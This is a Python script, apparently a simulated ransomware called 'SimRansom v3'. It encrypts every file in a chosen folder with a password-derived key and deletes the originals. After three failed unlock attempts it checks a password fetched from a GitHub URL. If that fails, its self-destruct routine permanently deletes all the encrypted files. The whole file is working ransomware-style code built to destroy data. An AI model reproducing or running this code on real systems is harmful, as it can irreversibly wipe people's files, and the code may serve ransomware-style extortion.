#!/usr/bin/env python3
import os
import base64
import hashlib
import json
import requests
import time
from getpass import getpass
from cryptography.fernet import Fernet
from colorama import Fore, init

init(autoreset=True)

MAX_ATTEMPTS = 3
REMOTE_URL = "https://raw.githubusercontent.com/sunnamsriram1/unlock-key/main/key.json"
EXTENSION = ".locked"

# Generate key from password
def generate_key(password):
    key = hashlib.sha256(password.encode()).digest()
    return Fernet(base64.urlsafe_b64encode(key))

# Encrypt file
def encrypt_file(filepath, fernet):
    with open(filepath, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(filepath + EXTENSION, "wb") as f:
        f.write(encrypted)
    os.remove(filepath)
    print(Fore.YELLOW + f"🔒 Encrypted: {os.path.basename(filepath)}")

# Decrypt file
def decrypt_file(filepath, fernet):
    with open(filepath, "rb") as f:
        data = f.read()
    decrypted = fernet.decrypt(data)
    original_path = filepath.replace(EXTENSION, "")
    with open(original_path, "wb") as f:
        f.write(decrypted)
    os.remove(filepath)
    print(Fore.GREEN + f"✅ Unlocked: {os.path.basename(original_path)}")

# Fetch password from GitHub
def fetch_remote_password():
    try:
        r = requests.get(REMOTE_URL, timeout=5)
        if r.status_code == 200:
            return json.loads(r.text).get("remote_password")
    except:
        return None

# Self destruct
def self_destruct(folder):
    print(Fore.RED + "\n☠️  Initiating self-destruct in 10 seconds...")
    for i in range(1, 11):
        print(Fore.LIGHTRED_EX + f"⏳ {i}....")
        time.sleep(1)

    for file in os.listdir(folder):
        path = os.path.join(folder, file)
        if path.endswith(EXTENSION):
            os.remove(path)
            print(Fore.LIGHTRED_EX + f"Deleted: {file}")

    print(Fore.RED + "\n☠️  All encrypted files destroyed.")

# Main function
def main():
    print(Fore.CYAN + "\n🔐 SimRansom v3 — Remote Unlock File Locker")
    mode = input(Fore.YELLOW + "🔄 Mode (lock/unlock): ").strip().lower()
    folder = input("📁 Enter target folder path: ").strip()

    if not os.path.exists(folder):
        print(Fore.RED + "❌ Folder not found!")
        return

    password = getpass("🔑 Enter password: ")
    fernet = generate_key(password)

    if mode == "lock":
        for file in os.listdir(folder):
            path = os.path.join(folder, file)
            if os.path.isfile(path) and not path.endswith(EXTENSION):
                encrypt_file(path, fernet)

    elif mode == "unlock":
        attempts = 0
        while attempts < MAX_ATTEMPTS:
            try:
                for file in os.listdir(folder):
                    path = os.path.join(folder, file)
                    if path.endswith(EXTENSION):
                        decrypt_file(path, fernet)
                return
            except:
                attempts += 1
                print(Fore.RED + f"[X] Wrong password! ({attempts}/{MAX_ATTEMPTS})")
                if attempts < MAX_ATTEMPTS:
                    password = getpass("🔑 Enter password: ")
                    fernet = generate_key(password)

        # Max attempts exceeded
        print(Fore.YELLOW + "\n🌐 Checking remote unlock key...")
        remote_pw = fetch_remote_password()
        if remote_pw:
            if password == remote_pw:
                print(Fore.GREEN + "✅ Remote password matched! Unlocking...")
                fernet = generate_key(remote_pw)
                for file in os.listdir(folder):
                    path = os.path.join(folder, file)
                    if path.endswith(EXTENSION):
                        decrypt_file(path, fernet)
                return
            else:
                print(Fore.RED + "❌ Remote password incorrect.")
        else:
            print(Fore.RED + "❌ Could not fetch remote key.")

        # Final fallback
        self_destruct(folder)

    else:
        print(Fore.RED + "❌ Invalid mode! Use 'lock' or 'unlock'.")

if __name__ == "__main__":
    main()
